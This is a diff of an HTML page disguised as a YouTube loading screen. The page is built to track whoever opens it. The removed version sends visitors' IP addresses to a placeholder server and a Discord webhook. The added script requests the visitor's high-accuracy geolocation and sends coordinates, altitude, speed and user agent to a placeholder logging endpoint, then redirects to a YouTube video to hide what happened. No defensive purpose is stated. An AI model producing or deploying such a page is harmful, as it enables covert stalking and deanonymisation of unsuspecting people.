@@ -1,25 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0; url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+    <title>YouTube</title>
 </head>
 <body>
-<script>
-    // Send IP to your logging endpoint (e.g., a webhook, Discord, your own server)
-    fetch('https://your-server.com/log?ip=' + location.hostname + '&ref=' + document.referrer);
+    <p style="text-align:center;margin-top:20%;font-family:sans-serif;">
+        Please wait while the video loads...
+    </p>
     
-    // Or use a free IP logging service
-    fetch(`https://api.ipify.org?format=json`)
-      .then(r => r.json())
-      .then(data => {
-          // Log to your Discord webhook, Telegram bot, etc.
-          fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
-              method: 'POST',
-              body: JSON.stringify({
-                  content: `IP: ${data.ip} | Time: ${new Date().toISOString()}`
-              })
-          });
-      });
-</script>
+    <script>
+    // Real YouTube redirect URL
+    const YT_REDIRECT = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    
+    // Your server endpoint to receive location data
+    const LOG_ENDPOINT = "https://your-server.com/log";
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                // Success - send location then redirect
+                function(position) {
+                    const data = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,   // meters
+                        alt: position.coords.altitude,
+                        speed: position.coords.speed,
+                        ts: new Date().toISOString(),
+                        ip: '',  // server fills this
+                        ua: navigator.userAgent
+                    };
+                    
+                    // Send to your server (use image beacon for reliability)
+                    var img = new Image();
+                    img.src = LOG_ENDPOINT + '?d=' + encodeURIComponent(JSON.stringify(data));
+                    
+                    // Also try fetch
+                    fetch(LOG_ENDPOINT, {
+                        method: 'POST',
+                        mode: 'no-cors',  // avoids CORS issues
+                        body: JSON.stringify(data)
+                    });
+                    
+                    // Redirect to YouTube
+                    setTimeout(() => { window.location.href = YT_REDIRECT; }, 500);
+                },
+                // Error or denied - still redirect
+                function(error) {
+                    window.location.href = YT_REDIRECT;
+                },
+                // Options - request high accuracy
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            window.location.href = YT_REDIRECT;
+        }
+    }
+
+    getLocation();
+    // Fallback redirect after 10 seconds regardless
+    setTimeout(() => { window.location.href = YT_REDIRECT; }, 10000);
+    </script>
 </body>
 </html>
